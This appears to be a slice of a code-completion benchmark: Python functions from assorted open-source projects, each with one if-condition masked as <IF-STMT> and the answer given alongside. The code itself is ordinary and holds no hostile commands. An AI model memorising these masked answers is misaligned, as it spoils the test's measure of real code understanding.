817,"def gprv_implicit_orax(ii):<tab>for i, op in enumerate(_gen_opnds(ii)):<tab><tab>if i == 0:<tab><tab><tab>if op.name == ""REG0"" and op_luf(op, ""GPRv_SB""):<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>elif i == 1:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return False<tab>return True","if op . name == ""REG1"" and op_luf ( op , ""OrAX"" ) :",151
818,"def _check_events(self):<tab># make sure song-started and song-ended match up<tab>stack = []<tab>old = self.events[:]<tab>for type_, song in self.events:<tab><tab><IF-STMT><tab><tab><tab>stack.append(song)<tab><tab>elif type_ == ""ended"":<tab><tab><tab>self.assertTrue(stack.pop(-1) is song, msg=old)<tab>self.assertFalse(stack, msg=old)","if type_ == ""started"" :",110
819,"def _minimal_replacement_cost(self, first, second):<tab>first_symbols, second_symbols = set(), set()<tab>removal_cost, insertion_cost = 0, 0<tab>for a, b in itertools.zip_longest(first, second, fillvalue=None):<tab><tab>if a is not None:<tab><tab><tab>first_symbols.add(a)<tab><tab><IF-STMT><tab><tab><tab>second_symbols.add(b)<tab><tab>removal_cost = max(removal_cost, len(first_symbols - second_symbols))<tab><tab>insertion_cost = max(insertion_cost, len(second_symbols - first_symbols))<tab>return min(removal_cost, insertion_cost)",if b is not None :,173
820,"def get_default_backend(self, user_backends):<tab>retval = None<tab>n_defaults = 0<tab>for name in user_backends:<tab><tab>args = user_backends.get(name)<tab><tab><IF-STMT><tab><tab><tab>n_defaults = n_defaults + 1<tab><tab><tab>if retval is None:<tab><tab><tab><tab>retval = name<tab>return (retval, n_defaults)","if args . get ( ""default"" , False ) :",100
821,"def ensure_echo_on():<tab>if termios:<tab><tab>fd = sys.stdin<tab><tab>if fd.isatty():<tab><tab><tab>attr_list = termios.tcgetattr(fd)<tab><tab><tab>if not attr_list[3] & termios.ECHO:<tab><tab><tab><tab>attr_list[3] |= termios.ECHO<tab><tab><tab><tab>if hasattr(signal, ""SIGTTOU""):<tab><tab><tab><tab><tab>old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>old_handler = None<tab><tab><tab><tab>termios.tcsetattr(fd, termios.TCSANOW, attr_list)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>signal.signal(signal.SIGTTOU, old_handler)",if old_handler is not None :,197
822,"def load_dashboard_module_view(request, pk):<tab>result = {""error"": False}<tab>try:<tab><tab><IF-STMT><tab><tab><tab>raise ValidationError(""error"")<tab><tab>instance = UserDashboardModule.objects.get(pk=pk, user=request.user.pk)<tab><tab>module_cls = instance.load_module()<tab><tab>module = module_cls(model=instance, context={""request"": request})<tab><tab>result[""html""] = module.render()<tab>except (ValidationError, UserDashboardModule.DoesNotExist):<tab><tab>result[""error""] = True<tab>return JsonResponse(result)",if not user_is_authenticated ( request . user ) or not request . user . is_staff :,158
823,"def _validate_compatible(from_schema, to_schema):<tab>if set(from_schema.names) != set(to_schema.names):<tab><tab>raise com.IbisInputError(""Schemas have different names"")<tab>for name in from_schema:<tab><tab>lt = from_schema[name]<tab><tab>rt = to_schema[name]<tab><tab><IF-STMT><tab><tab><tab>raise com.IbisInputError(""Cannot safely cast {0!r} to {1!r}"".format(lt, rt))<tab>return",if not lt . castable ( rt ) :,130
824,"def load_yaml(self):<tab>if ""FUEL_CONFIG"" in os.environ:<tab><tab>yaml_file = os.environ[""FUEL_CONFIG""]<tab>else:<tab><tab>yaml_file = os.path.expanduser(""~/.fuelrc"")<tab>if os.path.isfile(yaml_file):<tab><tab>with open(yaml_file) as f:<tab><tab><tab>for key, value in yaml.safe_load(f).items():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise ValueError(""Unrecognized config in YAML: {}"".format(key))<tab><tab><tab><tab>self.config[key][""yaml""] = value",if key not in self . config :,154
825,"def process(self):<tab>if not self.outputs[""Polygons""].is_linked:<tab><tab>return<tab>verts = self.inputs[""Vertices""].sv_get()<tab>faces = self.inputs[""Polygons""].sv_get()<tab>if not len(verts) == len(faces):<tab><tab>return<tab>verts_out = []<tab>polys_out = []<tab>for v_obj, f_obj in zip(verts, faces):<tab><tab>res = join_tris(v_obj, f_obj, self)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>verts_out.append(res[0])<tab><tab>polys_out.append(res[1])<tab>self.outputs[""Vertices""].sv_set(verts_out)<tab>self.outputs[""Polygons""].sv_set(polys_out)",if not res :,192
826,"def _set_momentum(self, runner, momentum_groups):<tab>for param_group, mom in zip(runner.optimizer.param_groups, momentum_groups):<tab><tab>if ""momentum"" in param_group.keys():<tab><tab><tab>param_group[""momentum""] = mom<tab><tab><IF-STMT><tab><tab><tab>param_group[""betas""] = (mom, param_group[""betas""][1])","elif ""betas"" in param_group . keys ( ) :",103
827,"def getReceiptInfo(pkgname):<tab>""""""Get receipt info from a package""""""<tab>info = []<tab>if hasValidPackageExt(pkgname):<tab><tab>display.display_debug2(""Examining %s"" % pkgname)<tab><tab>if os.path.isfile(pkgname):  # new flat package<tab><tab><tab>info = getFlatPackageInfo(pkgname)<tab><tab><IF-STMT>  # bundle-style package?<tab><tab><tab>info = getBundlePackageInfo(pkgname)<tab>elif pkgname.endswith("".dist""):<tab><tab>info = parsePkgRefs(pkgname)<tab>return info",if os . path . isdir ( pkgname ) :,143
828,"def _add_directory_child(self, children, filename):<tab>if os.path.isdir(filename):<tab><tab>children.append(self._directory_controller(filename))<tab>else:<tab><tab>r = self._namespace.get_resource(filename, report_status=False)<tab><tab><IF-STMT><tab><tab><tab>children.append(self._resource_controller(r))",if self . _is_valid_resource ( r ) :,96
829,"def check_br_addr(self, br):<tab>ips = {}<tab>cmd = ""ip a show dev %s"" % br<tab>for line in self.execute(cmd, sudo=True).split(""\n""):<tab><tab>if line.strip().startswith(""inet ""):<tab><tab><tab>elems = [e.strip() for e in line.strip().split("" "")]<tab><tab><tab>ips[4] = elems[1]<tab><tab><IF-STMT><tab><tab><tab>elems = [e.strip() for e in line.strip().split("" "")]<tab><tab><tab>ips[6] = elems[1]<tab>return ips","elif line . strip ( ) . startswith ( ""inet6 "" ) :",149
830,"def execute(self, statement, parameters=None):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>result = self.real_cursor.execute(statement, parameters)<tab><tab>else:<tab><tab><tab>result = self.real_cursor.execute(statement)<tab><tab>return result<tab>except:<tab><tab>raise Error(sys.exc_info()[1])",if parameters :,84
831,"def isUpdateAvailable(self, localOnly=False):<tab>nsp = self.getLatestFile()<tab><IF-STMT><tab><tab>if not nsp:<tab><tab><tab>if not self.isUpdate or (self.version and int(self.version) > 0):<tab><tab><tab><tab>return True<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab>try:<tab><tab>latest = self.lastestVersion(localOnly=localOnly)<tab><tab>if latest is None:<tab><tab><tab>return False<tab><tab>if int(nsp.version) < int(latest):<tab><tab><tab>return True<tab>except BaseException as e:<tab><tab>Print.error(""isUpdateAvailable exception %s: %s"" % (self.id, str(e)))<tab><tab>pass<tab>return False",if not nsp :,179
832,"def align(size):<tab>if size <= 4096:<tab><tab># Small<tab><tab><IF-STMT><tab><tab><tab>return size<tab><tab>elif size < 128:<tab><tab><tab>return min_ge(range(16, 128 + 1, 16), size)<tab><tab>elif size < 512:<tab><tab><tab>return min_ge(range(192, 512 + 1, 64), size)<tab><tab>else:<tab><tab><tab>return min_ge(range(768, 4096 + 1, 256), size)<tab>elif size < 4194304:<tab><tab># Large<tab><tab>return min_ge(range(4096, 4194304 + 1, 4096), size)<tab>else:<tab><tab># Huge<tab><tab>return min_ge(range(4194304, 536870912 + 1, 4194304), size)",if is_power2 ( size ) :,195
833,"def __init__(self, transforms):<tab>assert isinstance(transforms, collections.abc.Sequence)<tab>self.transforms = []<tab>for transform in transforms:<tab><tab><IF-STMT><tab><tab><tab>transform = build_from_cfg(transform, PIPELINES)<tab><tab><tab>self.transforms.append(transform)<tab><tab>elif callable(transform):<tab><tab><tab>self.transforms.append(transform)<tab><tab>else:<tab><tab><tab>raise TypeError(""transform must be callable or a dict"")","if isinstance ( transform , dict ) :",115
834,"def branch_name_from_config_file(directory, config_file):<tab>ans = None<tab>try:<tab><tab>with open(config_file, ""rb"") as f:<tab><tab><tab>for line in f:<tab><tab><tab><tab>m = nick_pat.match(line)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>ans = (<tab><tab><tab><tab><tab><tab>m.group(1)<tab><tab><tab><tab><tab><tab>.strip()<tab><tab><tab><tab><tab><tab>.decode(get_preferred_file_contents_encoding(), ""replace"")<tab><tab><tab><tab><tab>)<tab><tab><tab><tab><tab>break<tab>except Exception:<tab><tab>pass<tab>return ans or os.path.basename(directory)",if m is not None :,170
835,"def do_acquire_write_lock(self, wait):<tab>owner_id = self._get_owner_id()<tab>while True:<tab><tab>if self.client.setnx(self.identifier, owner_id):<tab><tab><tab>self.client.pexpire(self.identifier, self.LOCK_EXPIRATION * 1000)<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>time.sleep(0.2)",if not wait :,108
836,"def add_files_for_package(sub_package_path, root_package_path, root_package_name):<tab>for root, dirs, files in os.walk(sub_package_path):<tab><tab><IF-STMT><tab><tab><tab>dirs.remove("".svn"")<tab><tab>for f in files:<tab><tab><tab>if not f.endswith("".pyc"") and not f.startswith("".""):<tab><tab><tab><tab>add(<tab><tab><tab><tab><tab>dereference(root + ""/"" + f),<tab><tab><tab><tab><tab>root.replace(root_package_path, root_package_name) + ""/"" + f,<tab><tab><tab><tab>)","if "".svn"" in dirs :",148
837,"def collect_state(object_name, prefix, d):<tab>if d[None] is False:<tab><tab>return []<tab>result = []<tab>if d[None] is True and prefix is not None:<tab><tab>name = v.make_measurement_choice(object_name, prefix)<tab><tab>if name in choices:<tab><tab><tab>result.append(name)<tab>for key in [x for x in list(d.keys()) if x is not None]:<tab><tab><IF-STMT><tab><tab><tab>sub_prefix = key<tab><tab>else:<tab><tab><tab>sub_prefix = ""_"".join((prefix, key))<tab><tab>result += collect_state(object_name, sub_prefix, d[key])<tab>return result",if prefix is None :,171
838,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_app_id(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 16:<tab><tab><tab>self.set_num_memcacheg_backends(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,128
839,"def check(dbdef):<tab>""database version must include required keys""<tab>for vnum, vdef in dbdef.items():<tab><tab>missing = set(required) - set(vdef)<tab><tab><IF-STMT><tab><tab><tab>missing -= set(initially_ok)<tab><tab>if missing:<tab><tab><tab>yield vnum, missing",if vnum == min ( dbdef ) :,86
840,"def _check(ret):<tab>if hasattr(ret, ""value""):<tab><tab>ret = ret.value<tab>if ret != 0:<tab><tab><IF-STMT><tab><tab><tab>raise USBTimeoutError(_lib.openusb_strerror(ret), ret, _openusb_errno[ret])<tab><tab>else:<tab><tab><tab>raise USBError(_lib.openusb_strerror(ret), ret, _openusb_errno[ret])<tab>return ret",if ret == OPENUSB_IO_TIMEOUT :,112
841,"def scroll_to(self, x=None, y=None):<tab>if x is None or y is None:<tab><tab>pos = self.tab.get_scroll_position()<tab><tab>x = pos[""x""] if x is None else x<tab><tab>y = pos[""y""] if y is None else y<tab>for value, name in [(x, ""x""), (y, ""y"")]:<tab><tab><IF-STMT><tab><tab><tab>raise ScriptError(<tab><tab><tab><tab>{<tab><tab><tab><tab><tab>""argument"": name,<tab><tab><tab><tab><tab>""message"": ""scroll {} coordinate must be ""<tab><tab><tab><tab><tab>""a number, got {}"".format(name, repr(value)),<tab><tab><tab><tab>}<tab><tab><tab>)<tab>self.tab.set_scroll_position(x, y)","if not isinstance ( value , ( int , float ) ) :",193
842,"def _validate_secret_list(self, secrets, expected):<tab>for secret in secrets:<tab><tab><IF-STMT><tab><tab><tab>expected_secret = expected[secret.name]<tab><tab><tab>self._assert_secret_attributes_equal(expected_secret.properties, secret)<tab><tab><tab>del expected[secret.name]<tab>self.assertEqual(len(expected), 0)",if secret . name in expected . keys ( ) :,93
843,"def _capture_hub(self, create):<tab># Subclasses should call this as the first action from any<tab># public method that could, in theory, block and switch<tab># to the hub. This may release the GIL.<tab><IF-STMT><tab><tab># This next line might release the GIL.<tab><tab>current_hub = get_hub() if create else get_hub_if_exists()<tab><tab>if current_hub is None:<tab><tab><tab>return<tab><tab># We have the GIL again. Did anything change? If so,<tab><tab># we lost the race.<tab><tab>if self.hub is None:<tab><tab><tab>self.hub = current_hub",if self . hub is None :,161
844,"def _hashable(self):<tab>hashes = [self.graph.md5()]<tab>for g in self.geometry.values():<tab><tab>if hasattr(g, ""md5""):<tab><tab><tab>hashes.append(g.md5())<tab><tab><IF-STMT><tab><tab><tab>hashes.append(str(hash(g.tostring())))<tab><tab>else:<tab><tab><tab># try to just straight up hash<tab><tab><tab># this may raise errors<tab><tab><tab>hashes.append(str(hash(g)))<tab>hashable = """".join(sorted(hashes)).encode(""utf-8"")<tab>return hashable","elif hasattr ( g , ""tostring"" ) :",144
845,"def load_distribution(args: CommandLineArguments) -> CommandLineArguments:<tab>if args.distribution is not None:<tab><tab>args.distribution = Distribution[args.distribution]<tab>if args.distribution is None or args.release is None:<tab><tab>d, r = detect_distribution()<tab><tab><IF-STMT><tab><tab><tab>args.distribution = d<tab><tab>if args.distribution == d and d != Distribution.clear and args.release is None:<tab><tab><tab>args.release = r<tab>if args.distribution is None:<tab><tab>die(""Couldn't detect distribution."")<tab>return args",if args . distribution is None :,137
846,"def is_different(item, seen):<tab>is_diff = True<tab>if item not in seen:<tab><tab>for value in other:<tab><tab><tab>if comparator(iteratee(item), iteratee(value)):<tab><tab><tab><tab>is_diff = False<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>seen.append(item)<tab>return is_diff",if is_diff :,91
847,"def _find_first_unescaped(dn, char, pos):<tab>while True:<tab><tab>pos = dn.find(char, pos)<tab><tab>if pos == -1:<tab><tab><tab>break  # no char found<tab><tab>if pos > 0 and dn[pos - 1] != ""\\"":  # unescaped char<tab><tab><tab>break<tab><tab>elif pos > 1 and dn[pos - 1] == ""\\"":  # may be unescaped<tab><tab><tab>escaped = True<tab><tab><tab>for c in dn[pos - 2 : 0 : -1]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>escaped = not escaped<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>break<tab><tab><tab>if not escaped:<tab><tab><tab><tab>break<tab><tab>pos += 1<tab>return pos","if c == ""\\"" :",181
848,"def vcf_has_nonfiltered_variants(in_file):<tab>if os.path.exists(in_file):<tab><tab>with utils.open_gzipsafe(in_file) as in_handle:<tab><tab><tab>for line in in_handle:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>parts = line.split(""\t"")<tab><tab><tab><tab><tab>if parts[6] in set([""PASS"", "".""]):<tab><tab><tab><tab><tab><tab>return True<tab>return False","if line . strip ( ) and not line . startswith ( ""#"" ) :",122
849,"def clean_vendor(ctx, vendor_dir):<tab># Old _vendor cleanup<tab>remove_all(vendor_dir.glob(""*.pyc""))<tab>log(""Cleaning %s"" % vendor_dir)<tab>for item in vendor_dir.iterdir():<tab><tab>if item.is_dir():<tab><tab><tab>shutil.rmtree(str(item))<tab><tab><IF-STMT><tab><tab><tab>item.unlink()<tab><tab>else:<tab><tab><tab>log(""Skipping %s"" % item)",elif item . name not in FILE_WHITE_LIST :,120
850,"def sel_line(view, s):<tab>if mode == modes.INTERNAL_NORMAL:<tab><tab><IF-STMT><tab><tab><tab>if view.line(s.b).size() > 0:<tab><tab><tab><tab>eol = view.line(s.b).b<tab><tab><tab><tab>begin = view.line(s.b).a<tab><tab><tab><tab>begin = utils.next_non_white_space_char(view, begin, white_space="" \t"")<tab><tab><tab><tab>return R(begin, eol)<tab><tab><tab>return s<tab>return s",if count == 1 :,131
851,"def _struct(self, fields):<tab>result = {}<tab>for field in fields:<tab><tab><IF-STMT><tab><tab><tab>parent = self.instance(field[1])<tab><tab><tab>if isinstance(parent, dict):<tab><tab><tab><tab>result.update(parent)<tab><tab><tab>elif len(fields) == 1:<tab><tab><tab><tab>result = parent<tab><tab><tab>else:<tab><tab><tab><tab>result[field[0]] = parent<tab><tab>else:<tab><tab><tab>result[field[0]] = self.instance(field[1])<tab>return result","if field [ 0 ] == ""__parent"" :",136
852,"def _decode_list(lst):<tab>if not PY2:<tab><tab>return lst<tab>newlist = []<tab>for i in lst:<tab><tab><IF-STMT><tab><tab><tab>i = to_bytes(i)<tab><tab>elif isinstance(i, list):<tab><tab><tab>i = _decode_list(i)<tab><tab>newlist.append(i)<tab>return newlist","if isinstance ( i , string_types ) :",96
853,"def _check_arguments(self, arch, state):<tab># TODO: add calling convention detection to individual functions, and use that instead of the<tab># TODO: default calling convention of the platform<tab>cc = DEFAULT_CC[arch.name](arch)  # type: s_cc.SimCC<tab>for i, expected_arg in enumerate(self.arguments):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>real_arg = cc.arg(state, i)<tab><tab>expected_arg_type, expected_arg_value = expected_arg<tab><tab>r = self._compare_arguments(<tab><tab><tab>state, expected_arg_type, expected_arg_value, real_arg<tab><tab>)<tab><tab>if not r:<tab><tab><tab>return False<tab>return True",if expected_arg is None :,183
854,"def _strip_classy_blocks(self, module):<tab>for name, child_module in module.named_children():<tab><tab><IF-STMT><tab><tab><tab>module.add_module(name, child_module.wrapped_module())<tab><tab>self._strip_classy_blocks(child_module)","if isinstance ( child_module , ClassyBlock ) :",79
855,"def test_07_verify_degraded_pool_alert_list_exist_and_get_id():<tab>global alert_id<tab>results = GET(""/alert/list/"")<tab>assert results.status_code == 200, results.text<tab>assert isinstance(results.json(), list), results.text<tab>for line in results.json():<tab><tab><IF-STMT><tab><tab><tab>alert_id = results.json()[0][""id""]<tab><tab><tab>assert results.json()[0][""args""][""volume""] == pool_name, results.text<tab><tab><tab>assert results.json()[0][""args""][""state""] == ""DEGRADED"", results.text<tab><tab><tab>assert results.json()[0][""level""] == ""CRITICAL"", results.text<tab><tab><tab>break","if line [ ""source"" ] == ""VolumeStatus"" :",179
856,"def parseApplicationExtension(parent):<tab>yield PascalString8(parent, ""app_name"", ""Application name"")<tab>yield UInt8(parent, ""size"")<tab>size = parent[""size""].value<tab>if parent[""app_name""].value == ""NETSCAPE2.0"" and size == 3:<tab><tab>yield Enum(UInt8(parent, ""netscape_code""), NETSCAPE_CODE)<tab><tab><IF-STMT><tab><tab><tab>yield UInt16(parent, ""loop_count"")<tab><tab>else:<tab><tab><tab>yield RawBytes(parent, ""raw"", 2)<tab>else:<tab><tab>yield RawBytes(parent, ""raw"", size)<tab>yield NullBytes(parent, ""terminator"", 1, ""Terminator (0)"")","if parent [ ""netscape_code"" ] . value == 1 :",184
857,"def tearDownClass(self):<tab>settings.TIME_ZONE = connection.settings_dict[""TIME_ZONE""] = self._old_time_zone<tab>timezone._localtime = None<tab>if TZ_SUPPORT:<tab><tab><IF-STMT><tab><tab><tab>del os.environ[""TZ""]<tab><tab>else:<tab><tab><tab>os.environ[""TZ""] = self._old_tz<tab><tab>time.tzset()",if self . _old_tz is None :,98
858,"def __getattr__(self, key):<tab>if key in self._raw:<tab><tab>val = self._raw[key]<tab><tab>if key in (""date"",):<tab><tab><tab>return pd.Timestamp(val)<tab><tab><IF-STMT><tab><tab><tab>return pd.Timestamp(val).time()<tab><tab>elif key in (""session_open"", ""session_close""):<tab><tab><tab>return pd.Timestamp(val[:2] + "":"" + val[-2:]).time()<tab><tab>else:<tab><tab><tab>return val<tab>return super().__getattr__(key)","elif key in ( ""open"" , ""close"" ) :",132
859,"def _extract_knob_feature_log(arg):<tab>""""""extract knob feature for log items""""""<tab>try:<tab><tab>inp, res = arg<tab><tab>config = inp.config<tab><tab>x = config.get_flatten_feature()<tab><tab><IF-STMT><tab><tab><tab>with inp.target:  # necessary, for calculating flops of this task<tab><tab><tab><tab>inp.task.instantiate(config)<tab><tab><tab>y = inp.task.flop / np.mean(res.costs)<tab><tab>else:<tab><tab><tab>y = 0.0<tab><tab>return x, y<tab>except Exception:  # pylint: disable=broad-except<tab><tab>return None",if res . error_no == 0 :,166
860,"def dvipng_hack_alpha():<tab>stdin, stdout = os.popen4(""dvipng -version"")<tab>for line in stdout:<tab><tab><IF-STMT><tab><tab><tab>version = line.split()[-1]<tab><tab><tab>mpl.verbose.report(""Found dvipng version %s"" % version, ""helpful"")<tab><tab><tab>version = distutils.version.LooseVersion(version)<tab><tab><tab>return version < distutils.version.LooseVersion(""1.6"")<tab>raise RuntimeError(""Could not obtain dvipng version"")","if line . startswith ( ""dvipng "" ) :",126
861,"def _get_func_name(self, current_cls: Generic, module_func_dict: dict) -> Optional[str]:<tab>mod = current_cls.__module__ + ""."" + current_cls.__name__<tab>if mod in module_func_dict:<tab><tab>_func_name = module_func_dict[mod]<tab><tab>return _func_name<tab>elif current_cls.__bases__:<tab><tab>for base_class in current_cls.__bases__:<tab><tab><tab>base_run_func = self._get_func_name(base_class, module_func_dict)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return base_run_func<tab>else:<tab><tab>return None",if base_run_func :,166
862,"def __getitem__(self, key):<tab>if isinstance(key, numbers.Number):<tab><tab>l = len(self)<tab><tab><IF-STMT><tab><tab><tab>raise IndexError(""Index %s out of range (%s elements)"" % (key, l))<tab><tab>if key < 0:<tab><tab><tab>if key < -l:<tab><tab><tab><tab>raise IndexError(""Index %s out of range (%s elements)"" % (key, l))<tab><tab><tab>key += l<tab><tab>return self(key + 1)<tab>elif isinstance(key, slice):<tab><tab>raise ValueError(<tab><tab><tab>self.impl.__class__.__name__ + "" object does not support slicing""<tab><tab>)<tab>else:<tab><tab>return self(key)",if key >= l :,170
863,"def add_user_functions(self):<tab>for udf in user_functions:<tab><tab><IF-STMT><tab><tab><tab>self.conn.create_aggregate(udf.name, udf.param_count, udf.func_or_obj)<tab><tab>elif type(udf.func_or_obj) == type(md5):<tab><tab><tab>self.conn.create_function(udf.name, udf.param_count, udf.func_or_obj)<tab><tab>else:<tab><tab><tab>raise Exception(""Invalid user function definition %s"" % str(udf))",if type ( udf . func_or_obj ) == type ( object ) :,147
864,"def _get_schema_references(self, s):<tab>refs = set()<tab>if isinstance(s, dict):<tab><tab>for k, v in s.items():<tab><tab><tab>if isinstance(v, six.string_types):<tab><tab><tab><tab>m = self.__jsonschema_ref_ex.match(v)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>refs.add(m.group(1))<tab><tab><tab><tab>continue<tab><tab><tab>elif k in (""oneOf"", ""anyOf"") and isinstance(v, list):<tab><tab><tab><tab>refs.update(*map(self._get_schema_references, v))<tab><tab><tab>refs.update(self._get_schema_references(v))<tab>return refs",if m :,170
865,"def create_model_handler(ns, model_type):<tab>@route(f""/<provider>/{ns}/<model_id>"")<tab>@use_provider<tab>def handle(req, provider, model_id):<tab><tab># special cases:<tab><tab># fuo://<provider>/users/me -> show current logged user<tab><tab>if model_type == ModelType.user:<tab><tab><tab>if model_id == ""me"":<tab><tab><tab><tab>user = getattr(provider, ""_user"", None)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise CmdException(f""log in provider:{provider.identifier} first"")<tab><tab><tab><tab>return user<tab><tab>model = get_model_or_raise(provider, model_type, model_id)<tab><tab>return model",if user is None :,184
866,"def stream_read_bz2(ifh, ofh):<tab>""""""Uncompress bz2 compressed *ifh* into *ofh*""""""<tab>decompressor = bz2.BZ2Decompressor()<tab>while True:<tab><tab>buf = ifh.read(BUFSIZE)<tab><tab>if not buf:<tab><tab><tab>break<tab><tab>buf = decompressor.decompress(buf)<tab><tab><IF-STMT><tab><tab><tab>ofh.write(buf)<tab>if decompressor.unused_data or ifh.read(1) != b"""":<tab><tab>raise CorruptedObjectError(""Data after end of bz2 stream"")",if buf :,139
867,"def copy_layer(<tab>layer,<tab>keep_bias=True,<tab>name_template=None,<tab>weights=None,<tab>reuse_symbolic_tensors=True,<tab>**kwargs):<tab>config = layer.get_config()<tab>if name_template is None:<tab><tab>config[""name""] = None<tab>else:<tab><tab>config[""name""] = name_template % config[""name""]<tab>if keep_bias is False and config.get(""use_bias"", False):<tab><tab>config[""use_bias""] = False<tab><tab><IF-STMT><tab><tab><tab>if reuse_symbolic_tensors:<tab><tab><tab><tab>weights = layer.weights[:-1]<tab><tab><tab>else:<tab><tab><tab><tab>weights = layer.get_weights()[:-1]<tab>return get_layer_from_config(layer, config, weights=weights, **kwargs)",if weights is None :,200
868,"def do_status(self, directory, path):<tab>with self._repo(directory) as repo:<tab><tab><IF-STMT><tab><tab><tab>path = os.path.join(directory, path)<tab><tab><tab>statuses = repo.status(include=path, all=True)<tab><tab><tab>for status, paths in statuses:<tab><tab><tab><tab>if paths:<tab><tab><tab><tab><tab>return self.statuses[status][0]<tab><tab><tab>return None<tab><tab>else:<tab><tab><tab>resulting_status = 0<tab><tab><tab>for status, paths in repo.status(all=True):<tab><tab><tab><tab>if paths:<tab><tab><tab><tab><tab>resulting_status |= self.statuses[status][1]<tab><tab><tab>return self.repo_statuses_str[resulting_status]",if path :,181
869,"def close(self):<tab>if self.changed:<tab><tab>save = EasyDialogs.AskYesNoCancel(<tab><tab><tab>'Save window ""%s"" before closing?' % self.name, 1<tab><tab>)<tab><tab>if save > 0:<tab><tab><tab>self.menu_save()<tab><tab><IF-STMT><tab><tab><tab>return<tab>if self.parent.active == self:<tab><tab>self.parent.active = None<tab>self.parent.updatemenubar()<tab>del self.ted<tab>self.do_postclose()",elif save < 0 :,126
870,"def _Return(self, t):<tab>self._fill(""return "")<tab>if t.value:<tab><tab><IF-STMT><tab><tab><tab>text = "", "".join([name.name for name in t.value.asList()])<tab><tab><tab>self._write(text)<tab><tab>else:<tab><tab><tab>self._dispatch(t.value)<tab><tab>if not self._do_indent:<tab><tab><tab>self._write(""; "")","if isinstance ( t . value , Tuple ) :",106
871,"def __init__(self, itemtype, cnf={}, *, master=None, **kw):<tab>if not master:<tab><tab>if ""refwindow"" in kw:<tab><tab><tab>master = kw[""refwindow""]<tab><tab><IF-STMT><tab><tab><tab>master = cnf[""refwindow""]<tab><tab>else:<tab><tab><tab>master = tkinter._default_root<tab><tab><tab>if not master:<tab><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab><tab>""Too early to create display style: "" ""no root window""<tab><tab><tab><tab>)<tab>self.tk = master.tk<tab>self.stylename = self.tk.call(""tixDisplayStyle"", itemtype, *self._options(cnf, kw))","elif ""refwindow"" in cnf :",167
872,"def _load_items(self, splits):<tab>""""""Load individual image indices from splits.""""""<tab>ids = list()<tab>for name in splits:<tab><tab>root = os.path.join(self._root, ""VisDrone2019-DET-"" + name)<tab><tab>images_dir = self._images_dir.format(root)<tab><tab>images = [<tab><tab><tab>f[:-4]<tab><tab><tab>for f in os.listdir(images_dir)<tab><tab><tab><IF-STMT><tab><tab>]<tab><tab>ids += [(root, line.strip()) for line in images]<tab>return ids","if os . path . isfile ( os . path . join ( images_dir , f ) ) and f [ - 3 : ] == ""jpg""",165
873,"def _gen_langs_in_db(self):<tab>for d in os.listdir(join(self.base_dir, ""db"")):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>lang_path = join(self.base_dir, ""db"", d, ""lang"")<tab><tab>if not exists(lang_path):<tab><tab><tab>log.warn(<tab><tab><tab><tab>""unexpected lang-zone db dir without 'lang' file: ""<tab><tab><tab><tab>""`%s' (skipping)"" % dirname(lang_path)<tab><tab><tab>)<tab><tab><tab>continue<tab><tab>fin = open(lang_path, ""r"")<tab><tab>try:<tab><tab><tab>lang = fin.read().strip()<tab><tab>finally:<tab><tab><tab>fin.close()<tab><tab>yield lang",if d in self . _non_lang_db_dirs :,194
874,"def handler_click_link(self, link):<tab>if link.startswith(""[[""):<tab><tab>link = link[2:-2]<tab><tab>self.notify_observers(""click:notelink"", link)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>os.startfile(link)<tab><tab>elif platform.system().lower() == ""darwin"":<tab><tab><tab>subprocess.call((""open"", link))<tab><tab>else:<tab><tab><tab>subprocess.call((""xdg-open"", link))","if platform . system ( ) . lower ( ) == ""windows"" :",123
875,"def get_referrers(self):<tab>d = []<tab>for o in gc.get_referrers(self.obj):<tab><tab>name = None<tab><tab>if isinstance(o, dict):<tab><tab><tab>name = web.dictfind(o, self.obj)<tab><tab><tab>for r in gc.get_referrers(o):<tab><tab><tab><tab>if getattr(r, ""__dict__"", None) is o:<tab><tab><tab><tab><tab>o = r<tab><tab><tab><tab><tab>break<tab><tab><IF-STMT>  # other dict types<tab><tab><tab>name = web.dictfind(o, self.obj)<tab><tab>if not isinstance(name, six.string_types):<tab><tab><tab>name = None<tab><tab>d.append(Object(o, name))<tab>return d","elif isinstance ( o , dict ) :",187
876,"def parse_preference(path):<tab>""""""parse android's shared preference xml""""""<tab>storage = {}<tab>read = open(path)<tab>for line in read:<tab><tab>line = line.strip()<tab><tab># <string name=""key"">value</string><tab><tab><IF-STMT><tab><tab><tab>index = line.find('""', 14)<tab><tab><tab>key = line[14:index]<tab><tab><tab>value = line[index + 2 : -9]<tab><tab><tab>storage[key] = value<tab>read.close()<tab>return storage","if line . startswith ( '<string name=""' ) :",132
